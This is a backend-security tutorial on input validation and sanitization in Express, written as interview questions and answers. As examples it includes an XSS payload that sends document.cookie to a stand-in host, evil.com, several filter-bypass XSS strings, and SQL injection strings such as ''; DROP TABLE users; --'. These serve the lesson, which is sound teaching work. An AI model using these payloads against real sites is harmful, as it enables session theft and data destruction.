### 💡 **Whitelist Approach (Recommended)**

Accept only known-good input.

**Advantages:**
- ✅ More secure (default deny)
- ✅ Explicitly define allowed values
- ✅ Easier to maintain
- ✅ No bypass vulnerabilities

**Example:**

```javascript
// ✅ Whitelist - Allow only specific values
const allowedSortFields = ['createdAt', 'username', 'email'];

app.get('/api/users', (req, res) => {
  const { sortBy = 'createdAt' } = req.query;

  // Reject if not in whitelist
  if (!allowedSortFields.includes(sortBy)) {
    return res.status(400).json({ error: 'Invalid sort field' });
  }

  // Safe to use
  const users = await User.find().sort({ [sortBy]: -1 });
  res.json(users);
});

// ✅ Whitelist characters
const sanitizeUsername = (username) => {
  // Allow only alphanumeric and underscore
  return username.replace(/[^a-zA-Z0-9_]/g, '');
};
```

### 💡 **Blacklist Approach (Dangerous)**

Reject known-bad input.

**Disadvantages:**
- ❌ Less secure (default allow)
- ❌ Can't anticipate all attack vectors
- ❌ Easy to bypass with encoding/obfuscation
- ❌ Maintenance nightmare

**Example:**

```javascript
// ❌ Blacklist - Block specific values (DANGEROUS)
const blockedCharacters = ['<', '>', '"', "'", '&'];

const sanitize = (input) => {
  let cleaned = input;
  blockedCharacters.forEach(char => {
    cleaned = cleaned.replace(new RegExp(char, 'g'), '');
  });
  return cleaned;
};

// Problems:
// 1. Can be bypassed with encoding: &lt; &#60; \u003c
// 2. Doesn't block: ` ; | \n \r and many others
// 3. New attack vectors discovered constantly
```

**Comparison:**

| Approach | Security | Maintenance | Bypass Risk |
|----------|----------|-------------|-------------|
| **Whitelist** | ✅ High | ✅ Easy | ✅ Low |
| **Blacklist** | ❌ Low | ❌ Hard | ❌ High |

**Key Insight:**
> **Always prefer whitelist over blacklist.** Define what's allowed, not what's blocked. Attackers are creative - you can't predict all attack vectors.

## Interview Questions

### Q1: What's the difference between validation and sanitization?

**Answer:**

**Validation** checks if input meets requirements and accepts/rejects it:
- **Purpose**: Ensure correctness
- **Action**: Accept or reject (pass/fail)
- **Example**: Check if email format is valid
- **Returns**: Boolean or error message

**Sanitization** cleans/transforms input to make it safe:
- **Purpose**: Make data safe for use
- **Action**: Transform/clean the data
- **Example**: Escape HTML tags
- **Returns**: Cleaned version of input

**Real-World Example:**

```javascript
// Validation - Check if valid
const validateEmail = (email) => {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!regex.test(email)) {
    throw new Error('Invalid email format');
  }
  return true; // Pass or throw
};

// Sanitization - Clean the data
const sanitizeEmail = (email) => {
  return email
    .trim()           // Remove whitespace
    .toLowerCase();   // Normalize to lowercase
  // Always returns transformed data
};

// Use together
const processEmail = (email) => {
  // 1. Sanitize first
  const cleaned = sanitizeEmail(email);

  // 2. Then validate
  validateEmail(cleaned);

  // 3. Use cleaned, validated email
  return cleaned;
};
```

**Key Difference:**
- **Validation** = "Is this acceptable?" → Yes/No
- **Sanitization** = "Make this safe" → Transformed data

**When to Use:**
1. **Sanitize first** (trim, lowercase, remove extra spaces)
2. **Then validate** (check format, length, requirements)
3. **Use sanitized data** (it's clean and validated)

---

### Q2: Why should validation always be done on the server-side?

**Answer:**

Server-side validation is **mandatory** because client-side validation can be easily bypassed.

**Why Client-Side Can Be Bypassed:**

```javascript
// 1. Disable JavaScript
// User can turn off JavaScript in browser

// 2. Modify DOM
// User opens DevTools and removes 'required' attribute
<input type="email" required> // Remove this in browser

// 3. Direct API calls
// User can send requests directly using curl/Postman:
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"email": "invalid-email", "age": -5}'

// 4. Browser extensions
// Extensions can modify form validation

// 5. Intercept requests
// Tools like Burp Suite can intercept and modify requests
```

**Attack Scenario:**

```javascript
// Client-side only (INSECURE)
// client.js
const form = document.querySelector('form');
form.addEventListener('submit', (e) => {
  const age = document.querySelector('#age').value;

  if (age < 18) {
    e.preventDefault();
    alert('Must be 18 or older');
    return;
  }

  // Submit to server
});

// Attacker bypasses this easily:
// 1. Open DevTools
// 2. Run: document.querySelector('#age').value = 100
// 3. Submit form
// OR: Send direct POST request with any age value
```

**Secure Approach:**

```javascript
// ✅ Client-side validation (UX)
// Provides instant feedback, better UX
form.addEventListener('submit', (e) => {
  if (age < 18) {
    e.preventDefault();
    showError('Must be 18 or older');
  }
});

// ✅ Server-side validation (SECURITY)
// Cannot be bypassed - this is the real security
app.post('/api/register', (req, res) => {
  const { age } = req.body;

  // ALWAYS validate on server
  if (typeof age !== 'number' || age < 18) {
    return res.status(400).json({ error: 'Must be 18 or older' });
  }

  // Process registration...
});
```

**Why Server-Side is Mandatory:**

| Reason | Explanation |
|--------|-------------|
| **Cannot be bypassed** | Code runs on your server, under your control |
| **Direct API access** | Users can skip your frontend entirely |
| **Single source of truth** | One validation logic for web, mobile, and API |
| **Database validation** | Can check uniqueness, relationships, etc. |
| **Security** | Only layer attackers can't circumvent |

**Best Practice:**
```
✅ Client-side validation: For UX (quick feedback)
✅ Server-side validation: For security (mandatory)
✅ Use both: Best of both worlds
```

**Key Insight:**
> **Never trust the client.** Always assume the client is malicious. Server-side validation is the only real security - everything else is just UX improvement.

---

### Q3: How do you validate and sanitize user-generated HTML content?

**Answer:**

User-generated HTML is **extremely dangerous** (XSS risk) and requires multiple layers of protection.

**Attack Example:**

```javascript
// ❌ DANGEROUS - Never do this
app.post('/api/comments', (req, res) => {
  const { comment } = req.body;

  // Store directly
  await Comment.create({ text: comment });

  // Render directly in HTML
  res.send(`<div>${comment}</div>`);
});

// Attacker submits:
const malicious = `
  <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    });
  </script>
`;

// Result: All users' cookies stolen (session hijacking)
```

**Solution Levels:**

**Level 1: No HTML Allowed (Safest)**

```javascript
const sanitize = require('validator');

app.post('/api/comments', (req, res) => {
  let { comment } = req.body;

  // 1. Strip all HTML tags
  comment = comment.replace(/<[^>]*>/g, '');

  // 2. Escape special characters
  comment = sanitize.escape(comment);

  // 3. Store
  await Comment.create({ text: comment });

  res.json({ success: true });
});

// Input: <script>alert('XSS')</script>Hello
// Output: Hello
```

**Level 2: Allow Basic Formatting (Whitelist)**

```javascript
const sanitizeHtml = require('sanitize-html');

const cleanHtml = sanitizeHtml(dirty, {
  // Whitelist allowed tags
  allowedTags: [
    'b', 'i', 'em', 'strong', 'p', 'br',
    'ul', 'ol', 'li', 'a', 'blockquote'
  ],

  // Whitelist allowed attributes
  allowedAttributes: {
    'a': ['href', 'title'],
  },

  // Whitelist allowed URL schemes
  allowedSchemes: ['http', 'https', 'mailto'],

  // Remove disallowed tags (don't just escape them)
  allowedClasses: {},

  // Don't allow any data- attributes
  allowedAttributes: {
    'a': ['href'],
  },
});

app.post('/api/comments', async (req, res) => {
  const { comment } = req.body;

  // Sanitize HTML
  const clean = sanitizeHtml(comment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
    allowedAttributes: { 'a': ['href'] },
    allowedSchemes: ['http', 'https'],
  });

  await Comment.create({ text: clean });
  res.json({ success: true });
});

// Input: <script>alert('XSS')</script><b>Bold</b><a href="javascript:alert()">Click</a>
// Output: <b>Bold</b><a>Click</a> (script removed, javascript: scheme blocked)
```

**Level 3: Rich Text Editor (Most Complex)**

```javascript
const createDOMPurify = require('isomorphic-dompurify');
const DOMPurify = createDOMPurify();

const sanitizeRichText = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'b', 'i', 'em', 'strong', 'u', 's',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'blockquote', 'pre', 'code',
      'a', 'img',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
    ALLOWED_URI_REGEXP: /^(?:(?:https?):)/i, // Only HTTP(S)
  });
};

app.post('/api/posts', async (req, res) => {
  const { content } = req.body;

  // Sanitize rich HTML
  const clean = sanitizeRichText(content);

  await Post.create({ content: clean });
  res.json({ success: true });
});
```

**Frontend Rendering (Also Critical):**

```javascript
// ❌ DANGEROUS - Direct HTML injection
const div = document.createElement('div');
div.innerHTML = userComment; // XSS vulnerability

// ✅ SAFE - Text content only
const div = document.createElement('div');
div.textContent = userComment; // Automatically escaped

// ✅ SAFE - React (auto-escapes)
const Comment = ({ text }) => <div>{text}</div>; // Safe by default

// If you MUST render HTML in React:
const Comment = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
); // Only with sanitized HTML
```

**Complete Secure Flow:**

```javascript
// Backend: Sanitize on input
app.post('/api/comments', async (req, res) => {
  const clean = sanitizeHtml(req.body.comment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a'],
    allowedAttributes: { 'a': ['href'] },
  });

  await Comment.create({ text: clean });
  res.json({ success: true });
});

// Backend: Send sanitized HTML
app.get('/api/comments', async (req, res) => {
  const comments = await Comment.find();
  res.json(comments); // Already sanitized in DB
});

// Frontend: Render safely
// React auto-escapes, or use dangerouslySetInnerHTML with sanitized data
```

**Key Principles:**

```
1. ✅ Sanitize on INPUT (when storing)
2. ✅ Use whitelist (allow only safe tags)
3. ✅ Validate URL schemes (block javascript:, data:)
4. ✅ Escape on OUTPUT (when rendering)
5. ✅ Use CSP headers (defense in depth)
6. ❌ Never trust user HTML
7. ❌ Never use blacklist (can be bypassed)
```

**Key Insight:**
> **For user content, prefer plain text over HTML.** If you must allow HTML, use a strict whitelist with a battle-tested library like DOMPurify or sanitize-html. Never roll your own HTML sanitizer.

---

### Q4: What is the difference between whitelist and blacklist validation? Which is better?

**Answer:**

**Whitelist** (allowlist) accepts only known-good input. **Blacklist** (denylist) rejects known-bad input.

**Whitelist - Accept Only Known Good:**

```javascript
// ✅ Whitelist approach
const validateSortField = (field) => {
  const allowedFields = ['username', 'email', 'createdAt'];

  if (!allowedFields.includes(field)) {
    throw new Error('Invalid sort field');
  }

  return field; // Safe to use
};

// Only these exact values are allowed
// Everything else is rejected
```

**Blacklist - Reject Known Bad:**

```javascript
// ❌ Blacklist approach
const sanitizeInput = (input) => {
  const blockedChars = ['<', '>', '"', "'", ';', '--'];

  let cleaned = input;
  blockedChars.forEach(char => {
    cleaned = cleaned.replace(new RegExp(char, 'g'), '');
  });

  return cleaned;
};

// Problems:
// 1. Attacker uses encoding: &lt; &#60; \u003c
// 2. Attacker uses other dangerous chars: ` | & \n \0
// 3. New attack vectors discovered constantly
// 4. Can't anticipate all malicious inputs
```

**Real-World Attack on Blacklist:**

```javascript
// ❌ Blacklist blocks <script>
const blacklist = (input) => {
  return input.replace(/<script>/gi, '');
};

// Attacker bypasses:
blacklist('<script>alert("XSS")</script>')
// Result: alert("XSS")  ✅ Blocked

// But these work:
blacklist('<img src=x onerror="alert(1)">')
// ✅ BYPASSED - not blocked

blacklist('<svg onload="alert(1)">')
// ✅ BYPASSED - not blocked

blacklist('<iframe src="javascript:alert(1)">')
// ✅ BYPASSED - not blocked

blacklist('<<script>script>alert(1)<</script>/script>')
// ✅ BYPASSED - nested tags

blacklist('<scr<script>ipt>alert(1)</script>')
// ✅ BYPASSED - obfuscation

// Endless variations...
```

**Whitelist Stops All Attacks:**

```javascript
// ✅ Whitelist approach
const validateInput = (input) => {
  // Only allow alphanumeric and spaces
  if (!/^[a-zA-Z0-9\s]+$/.test(input)) {
    throw new Error('Invalid input');
  }
  return input;
};

// ALL of these are blocked:
validateInput('<script>alert(1)</script>') // ✅ Blocked
validateInput('<img src=x onerror="alert(1)">') // ✅ Blocked
validateInput('<<script>script>') // ✅ Blocked
validateInput('any unexpected input') // ✅ Blocked

// Only this is allowed:
validateInput('John Doe 123') // ✅ Allowed
```

**Comparison:**

| Aspect | Whitelist | Blacklist |
|--------|-----------|-----------|
| **Philosophy** | Default DENY | Default ALLOW |
| **Security** | ✅ High | ❌ Low |
| **Maintenance** | ✅ Easy | ❌ Hard |
| **Bypass Risk** | ✅ Very Low | ❌ Very High |
| **New Attacks** | ✅ Protected | ❌ Vulnerable |
| **Implementation** | Define what's allowed | Define what's blocked |
| **Best For** | Security-critical | Not recommended |

**Real-World Examples:**

```javascript
// ✅ Whitelist: File type validation
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
if (!allowedTypes.includes(file.mimetype)) {
  throw new Error('Invalid file type');
}

// ❌ Blacklist: File type validation (DANGEROUS)
const blockedTypes = ['application/x-msdownload', 'application/x-sh'];
if (blockedTypes.includes(file.mimetype)) {
  throw new Error('Blocked file type');
}
// Problem: Doesn't block .exe.jpg, .php, .jsp, .asp, etc.

// ✅ Whitelist: Username validation
if (!/^[a-zA-Z0-9_]{3,30}$/.test(username)) {
  throw new Error('Invalid username');
}

// ❌ Blacklist: Username validation (DANGEROUS)
if (/[<>;"'`]/.test(username)) {
  throw new Error('Invalid characters');
}
// Problem: Doesn't block many other dangerous chars

// ✅ Whitelist: SQL ORDER BY
const allowedSortFields = ['name', 'price', 'date'];
const sortBy = allowedSortFields.includes(req.query.sort)
  ? req.query.sort
  : 'date';

// ❌ Blacklist: SQL ORDER BY (SQL INJECTION)
const sortBy = req.query.sort.replace(/[;'"]/g, '');
// Problem: Doesn't prevent: UNION SELECT, DROP TABLE, etc.
```

**When Blacklist Seems Easier:**

```javascript
// Sometimes blacklist seems simpler:
// ❌ "Just remove these few bad characters"
const cleanEmail = email.replace(/[<>]/g, '');

// ✅ But whitelist is actually clearer:
if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
  throw new Error('Invalid email');
}
// Explicitly states what's allowed, easier to reason about
```

**Key Insight:**
> **Always use whitelist, never blacklist.** Attackers are endlessly creative - you can't predict all attack vectors. Define exactly what's allowed, reject everything else. This is a fundamental security principle.

**Answer Summary:**
- **Whitelist**: Accept only known-good → Secure, maintainable
- **Blacklist**: Reject known-bad → Insecure, can be bypassed
- **Always choose whitelist** for security-critical validation

---

### Q5: How do you validate file uploads securely?

**Answer:**

File upload validation requires **multiple layers of security** because attackers can easily fake file types.

**Security Layers:**

**Layer 1: Client-Side (UX Only)**

```javascript
// ❌ Easily bypassed - NOT security, just UX
<input
  type="file"
  accept="image/jpeg,image/png,image/gif"
/>

// User can:
// 1. Disable JavaScript
// 2. Modify DOM to remove 'accept'
// 3. Send direct POST request
```

**Layer 2: File Extension (Weak)**

```javascript
const path = require('path');

// ❌ Weak - Can be fooled
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];

const ext = path.extname(file.originalname).toLowerCase();
if (!allowedExtensions.includes(ext)) {
  throw new Error('Invalid file type');
}

// Problem: Attacker renames malicious.php → malicious.jpg
```

**Layer 3: MIME Type (Better)**

```javascript
// ✅ Better - Checks Content-Type header
const allowedMimeTypes = [
  'image/jpeg',
  'image/png',
  'image/gif',
];

if (!allowedMimeTypes.includes(file.mimetype)) {
  throw new Error('Invalid file type');
}

// Problem: Attacker can fake MIME type in request
```

**Layer 4: Magic Number / File Signature (Best)**

```javascript
const fs = require('fs');

// ✅ Best - Checks actual file content
const magicNumbers = {
  'image/jpeg': [
    Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // JFIF
    Buffer.from([0xFF, 0xD8, 0xFF, 0xE1]), // Exif
  ],
  'image/png': [Buffer.from([0x89, 0x50, 0x4E, 0x47])],
  'image/gif': [Buffer.from([0x47, 0x49, 0x46, 0x38])],
  'application/pdf': [Buffer.from([0x25, 0x50, 0x44, 0x46])],
};

const checkMagicNumber = (filePath, expectedMimeType) => {
  const buffer = fs.readFileSync(filePath);
  const header = buffer.slice(0, 4);

  const validSignatures = magicNumbers[expectedMimeType];
  if (!validSignatures) return false;

  return validSignatures.some(signature =>
    header.slice(0, signature.length).equals(signature)
  );
};

// Usage
if (!checkMagicNumber(file.path, file.mimetype)) {
  fs.unlinkSync(file.path); // Delete invalid file
  throw new Error('File content does not match declared type');
}
```

**Complete Secure Implementation:**

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

// Magic numbers for file type verification
const MAGIC_NUMBERS = {
  'image/jpeg': [
    Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]),
    Buffer.from([0xFF, 0xD8, 0xFF, 0xE1]),
    Buffer.from([0xFF, 0xD8, 0xFF, 0xE2]),
  ],
  'image/png': [Buffer.from([0x89, 0x50, 0x4E, 0x47])],
  'image/gif': [
    Buffer.from([0x47, 0x49, 0x46, 0x38, 0x37, 0x61]), // GIF87a
    Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]), // GIF89a
  ],
  'application/pdf': [Buffer.from([0x25, 0x50, 0x44, 0x46])],
};

// Step 1: Configure storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Store in temp directory first (for validation)
    cb(null, 'uploads/temp/');
  },
  filename: (req, file, cb) => {
    // Generate random filename (prevent overwrites)
    const randomName = crypto.randomBytes(16).toString('hex');
    cb(null, randomName); // No extension yet
  },
});

// Step 2: Configure file filter
const fileFilter = (req, file, cb) => {
  // Check 1: File extension
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
  const ext = path.extname(file.originalname).toLowerCase();

  if (!allowedExtensions.includes(ext)) {
    return cb(new Error('Invalid file extension'), false);
  }

  // Check 2: MIME type
  const allowedMimeTypes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf',
  ];

  if (!allowedMimeTypes.includes(file.mimetype)) {
    return cb(new Error('Invalid MIME type'), false);
  }

  cb(null, true);
};

// Step 3: Configure multer
const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB max
    files: 1, // Single file
  },
});

// Step 4: Magic number verification
const verifyFileType = (filePath, declaredMimeType) => {
  const buffer = fs.readFileSync(filePath);
  const validSignatures = MAGIC_NUMBERS[declaredMimeType];

  if (!validSignatures) return false;

  return validSignatures.some(signature => {
    const header = buffer.slice(0, signature.length);
    return header.equals(signature);
  });
};

// Step 5: Sanitize filename
const sanitizeFilename = (filename) => {
  return filename
    .replace(/[^a-zA-Z0-9.-]/g, '_') // Replace special chars
    .replace(/\.+/g, '.') // Remove multiple dots
    .replace(/^\./, '') // Remove leading dot
    .slice(0, 255); // Limit length
};

// Step 6: Upload endpoint
app.post('/api/upload', upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const tempPath = req.file.path;

  try {
    // Verify magic number
    if (!verifyFileType(tempPath, req.file.mimetype)) {
      fs.unlinkSync(tempPath); // Delete invalid file
      return res.status(400).json({
        error: 'File content does not match declared type',
      });
    }

    // Additional checks for images
    if (req.file.mimetype.startsWith('image/')) {
      // You can use 'sharp' library to:
      // 1. Verify it's a valid image
      // 2. Strip EXIF data (privacy)
      // 3. Resize/optimize

      const sharp = require('sharp');
      const metadata = await sharp(tempPath).metadata();

      // Check dimensions
      if (metadata.width > 4096 || metadata.height > 4096) {
        fs.unlinkSync(tempPath);
        return res.status(400).json({ error: 'Image too large' });
      }
    }

    // Generate final filename
    const sanitizedName = sanitizeFilename(req.file.originalname);
    const ext = path.extname(sanitizedName);
    const finalName = `${crypto.randomBytes(16).toString('hex')}${ext}`;
    const finalPath = `uploads/files/${finalName}`;

    // Move from temp to permanent storage
    fs.renameSync(tempPath, finalPath);

    // Save to database
    const file = await File.create({
      filename: finalName,
      originalName: sanitizedName,
      mimetype: req.file.mimetype,
      size: req.file.size,
      userId: req.user.id,
    });

    res.status(201).json({
      success: true,
      file: {
        id: file.id,
        name: file.originalName,
        size: file.size,
        url: `/uploads/files/${finalName}`,
      },
    });
  } catch (error) {
    // Clean up on error
    if (fs.existsSync(tempPath)) {
      fs.unlinkSync(tempPath);
    }

    console.error('Upload error:', error);
    res.status(500).json({ error: 'Upload failed' });
  }
});

// Step 7: Error handling
app.use((error, req, res, next) => {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({ error: 'File too large (max 5MB)' });
    }
    if (error.code === 'LIMIT_FILE_COUNT') {
      return res.status(400).json({ error: 'Too many files' });
    }
    if (error.code === 'LIMIT_UNEXPECTED_FILE') {
      return res.status(400).json({ error: 'Unexpected field name' });
    }
  }

  res.status(400).json({ error: error.message });
});
```

**Security Checklist:**

```
✅ 1. Extension check (basic)
✅ 2. MIME type check (better)
✅ 3. Magic number verification (best)
✅ 4. File size limit
✅ 5. Filename sanitization
✅ 6. Random filename generation
✅ 7. Temporary upload directory
✅ 8. Virus scanning (optional but recommended)
✅ 9. Image dimension limits
✅ 10. Strip EXIF data (privacy)
✅ 11. Store outside web root
✅ 12. Use CDN or object storage (S3)
```

**Additional Security:**

```javascript
// Virus scanning (ClamAV)
const NodeClam = require('clamscan');

const clam = await new NodeClam().init({
  clamdscan: {
    host: 'localhost',
    port: 3310,
  },
});

const { isInfected, viruses } = await clam.scanFile(filePath);

if (isInfected) {
  fs.unlinkSync(filePath);
  return res.status(400).json({ error: 'File contains malware' });
}
```

**Key Insight:**
> **Never trust file extensions or MIME types alone.** Always verify the actual file content using magic numbers (file signatures). Defense in depth: use multiple validation layers and always assume the user is trying to upload something malicious.

---

### Q6: What are some common validation mistakes that lead to security vulnerabilities?

**Answer:**

**1. Trusting Client-Side Validation Only**

```javascript
// ❌ DANGEROUS - Only client-side validation
// client.js
if (email.includes('@')) {
  submitForm();
}

// No server-side validation
app.post('/api/register', (req, res) => {
  User.create(req.body); // Accepts anything!
});

// Attack: Send direct POST request with invalid data
// Result: Garbage data in database, possible SQL injection, XSS
```

**2. Not Validating Data Types**

```javascript
// ❌ Type confusion vulnerability
app.post('/api/transfer', (req, res) => {
  const { amount } = req.body;

  // amount could be: "100", null, undefined, "abc", {}, []
  if (amount > 0) { // String "0" > 0 is false, but "-1" > 0 is false too!
    // Transfer money
  }
});

// Attack: Send amount: "0.1" or amount: "1e2" (scientific notation)
// Result: Type coercion bugs, unexpected behavior

// ✅ Fix: Validate types
const amount = parseFloat(req.body.amount);
if (isNaN(amount) || amount <= 0) {
  return res.status(400).json({ error: 'Invalid amount' });
}
```

**3. SQL Injection from String Concatenation**

```javascript
// ❌ SQL INJECTION
app.get('/api/users', (req, res) => {
  const { search } = req.query;

  // No validation or sanitization
  const query = `SELECT * FROM users WHERE name = '${search}'`;
  db.query(query);
});

// Attack: ?search=' OR '1'='1
// Result: SELECT * FROM users WHERE name = '' OR '1'='1'
// Returns all users (bypasses authentication)

// Attack: ?search='; DROP TABLE users; --
// Result: Deletes entire users table

// ✅ Fix: Use parameterized queries
const query = 'SELECT * FROM users WHERE name = ?';
db.query(query, [search]);
```

**4. Insufficient Length Validation**

```javascript
// ❌ No length limits - DoS vulnerability
app.post('/api/comments', (req, res) => {
  const { text } = req.body;
  // No length check
  Comment.create({ text });
});

// Attack: Send 100MB of text
// Result: Database bloat, memory exhaustion, DoS

// ✅ Fix: Enforce length limits
if (!text || text.length > 5000) {
  return res.status(400).json({ error: 'Comment must be 1-5000 characters' });
}
```

**5. Mass Assignment Vulnerability**

```javascript
// ❌ Mass assignment - Privilege escalation
app.post('/api/users', (req, res) => {
  // Directly pass request body to create
  const user = await User.create(req.body);
});

// Attack: Send { username: "hacker", role: "admin" }
// Result: Creates admin user!

// ✅ Fix: Whitelist allowed fields
const { username, email, password } = req.body;
const user = await User.create({ username, email, password });
// role is not included, defaults to 'user'
```

**6. Regex Denial of Service (ReDoS)**

```javascript
// ❌ Catastrophic backtracking
const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\.[a-zA-Z]+$/;

app.post('/api/validate', (req, res) => {
  const { email } = req.body;

  // No timeout on regex
  if (emailRegex.test(email)) {
    res.json({ valid: true });
  }
});

// Attack: Send email with many 'a's without @ symbol
// "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
// Result: Regex takes exponential time, server hangs (DoS)

// ✅ Fix: Use simple regex or library
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // No nested quantifiers
// Or use validator library:
const validator = require('validator');
if (!validator.isEmail(email)) {
  return res.status(400).json({ error: 'Invalid email' });
}
```

**7. Not Sanitizing Output (XSS)**

```javascript
// ❌ XSS vulnerability
app.get('/api/comments', async (req, res) => {
  const comments = await Comment.find();

  // Send directly to client
  res.json({ comments });
});

// Frontend renders:
div.innerHTML = comment.text; // XSS!

// Attack: Store comment with <script>alert('XSS')</script>
// Result: Script executes in all users' browsers

// ✅ Fix: Sanitize on input
const sanitizedText = sanitizeHtml(req.body.text, {
  allowedTags: [],
});
await Comment.create({ text: sanitizedText });

// Or escape on output (React does this automatically)
<div>{comment.text}</div> // React escapes automatically
```

**8. Trusting "Hidden" Form Fields**

```javascript
// ❌ Trusting hidden fields
// HTML:
<input type="hidden" name="price" value="10.00">

// Backend:
app.post('/api/order', (req, res) => {
  const { productId, price } = req.body;

  // Uses price from request!
  Order.create({ productId, price });
});

// Attack: Modify hidden field to price: 0.01
// Result: Buy product for 1 cent

// ✅ Fix: Always fetch price from database
const product = await Product.findById(productId);
Order.create({ productId, price: product.price });
```

**9. Integer Overflow**

```javascript
// ❌ No upper bound check
app.post('/api/purchase', (req, res) => {
  const { quantity } = req.body;

  // Only checks if positive
  if (quantity > 0) {
    const total = PRICE * quantity; // Could overflow
    // Process payment...
  }
});

// Attack: Send quantity: 999999999999
// Result: Integer overflow, negative total, free products

// ✅ Fix: Set reasonable upper bounds
if (quantity < 1 || quantity > 100) {
  return res.status(400).json({ error: 'Quantity must be 1-100' });
}
```

**10. No Rate Limiting on Validation**

```javascript
// ❌ No rate limiting - Allows brute force
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Validates credentials
  if (isValidCredentials(username, password)) {
    // Login
  }
});

// Attack: Try 1 million passwords
// Result: Account compromise

// ✅ Fix: Add rate limiting
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts',
});

app.post('/api/login', loginLimiter, (req, res) => {
  // Login logic
});
```

**Summary of Common Mistakes:**

| Mistake | Vulnerability | Impact |
|---------|--------------|--------|
| Client-side only | Bypassed validation | All attacks possible |
| No type validation | Type confusion | Logic errors, exploits |
| String concatenation | SQL injection | Data breach, deletion |
| No length limits | DoS | Service disruption |
| Mass assignment | Privilege escalation | Unauthorized access |
| Complex regex | ReDoS | Service disruption |
| No output sanitization | XSS | Account takeover |
| Trusting hidden fields | Price manipulation | Financial loss |
| No upper bounds | Integer overflow | Logic errors |
| No rate limiting | Brute force | Account compromise |

**Key Insight:**
> **Validation is not a one-time check.** You need multiple layers: type validation, format validation, length limits, sanitization, rate limiting, and never trusting any input from the client - even "hidden" fields.

---

## Best Practices

### ✅ Do's

**1. Always Validate on Server-Side**
- ✅ Client-side is for UX only
- ✅ Server-side is mandatory security
- ✅ Validate every single input

**2. Use Whitelist Approach**
- ✅ Define what's allowed
- ✅ Reject everything else
- ✅ Safer than blacklist

**3. Validate Early and Often**
- ✅ Validate at entry points
- ✅ Re-validate before critical operations
- ✅ Defense in depth

**4. Use Established Libraries**
- ✅ express-validator for Express
- ✅ Joi for schema validation
- ✅ DOMPurify for HTML sanitization
- ✅ Don't roll your own

**5. Sanitize After Validation**
- ✅ Validate first (accept/reject)
- ✅ Then sanitize (clean)
- ✅ Use sanitized data

**6. Set Reasonable Limits**
- ✅ Maximum length for strings
- ✅ Reasonable ranges for numbers
- ✅ File size limits
- ✅ Array length limits

**7. Validate Data Types**
- ✅ Check typeof
- ✅ Use parseInt/parseFloat
- ✅ Validate with schema libraries

**8. Use Parameterized Queries**
- ✅ Prevents SQL injection
- ✅ Use ? placeholders
- ✅ Or use ORM

**9. Implement Rate Limiting**
- ✅ Prevent brute force
- ✅ Limit validation attempts
- ✅ Use express-rate-limit

**10. Log Validation Failures**
- ✅ Monitor suspicious patterns
- ✅ Detect attack attempts
- ✅ Improve security

### ❌ Don'ts

**1. Never Trust Client Input**
- ❌ Not from forms
- ❌ Not from URLs
- ❌ Not from cookies
- ❌ Not from headers

**2. Never Use Blacklist for Security**
- ❌ Can be bypassed
- ❌ Incomplete protection
- ❌ Always use whitelist

**3. Never Skip Type Validation**
- ❌ Type coercion bugs
- ❌ Unexpected behavior
- ❌ Always check types

**4. Never Concatenate SQL Queries**
- ❌ SQL injection vulnerability
- ❌ Use parameterized queries
- ❌ Or use ORM

**5. Never Trust File Extensions**
- ❌ Can be faked
- ❌ Check magic numbers
- ❌ Verify actual content

**6. Never Render Unsanitized HTML**
- ❌ XSS vulnerability
- ❌ Sanitize first
- ❌ Use textContent or React

**7. Never Use Complex Regex**
- ❌ ReDoS vulnerability
- ❌ Use simple patterns
- ❌ Or use libraries

**8. Never Validate Only on Client**
- ❌ Easily bypassed
- ❌ Not real security
- ❌ Server-side is mandatory

**9. Never Assume Input Length**
- ❌ DoS vulnerability
- ❌ Always set limits
- ❌ Validate length

**10. Never Return Detailed Error Messages**
- ❌ Information disclosure
- ❌ Helps attackers
- ❌ Use generic messages

## Summary

- **Input validation** is the first line of defense against most web attacks
- **Server-side validation** is mandatory - client-side is only for UX
- **Whitelist approach** is always better than blacklist
- **Sanitization** cleans data after validation
- Use **established libraries** (express-validator, Joi, DOMPurify)
- **Multiple layers** of validation for critical data (files, money, etc.)
- **Never trust** any input from the client
- **Type validation** prevents type confusion bugs
- **Length limits** prevent DoS attacks
- **Parameterized queries** prevent SQL injection
- **Magic numbers** verify actual file content
- **Rate limiting** prevents brute force attacks

---
[← Back to Backend Security](../README.md)
